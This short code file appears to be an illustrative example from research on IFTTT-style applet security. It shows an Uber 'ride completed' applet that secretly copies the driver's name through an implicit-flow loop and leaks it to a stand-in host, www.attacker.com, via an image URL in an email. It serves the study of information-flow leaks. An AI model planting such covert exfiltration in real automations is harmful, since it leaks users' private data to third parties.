// Filter code in Example 6.1
// Maker: ---
// Link : ---
// ======================
// Applet that sends an email with the map of the Uber ride

// Trigger: Uber -> Ride completed
// Action: Email -> Send me an email

// Policy/Presence: Confidentiality of Uber drive data / No

rideMap = lbl('Uber.rideCompleted.TripMapImage');
driver = lbl('Uber.rideCompleted.DriverName');
i = 0;
j = 0;
var dst = '';
var t = false;
for (i = 0; i < driver.length; i++) {	
	for (j = 33; j < 127; j++) {
		t = (driver[i] == String.fromCharCode(j));
    if (t) {
			dst[i] = String.fromCharCode(j);
		}
  }
}
img = imgl("www.attacker.com?" + dst);
sink('Email.sendMeEmail', 'setBody', rideMap + img);
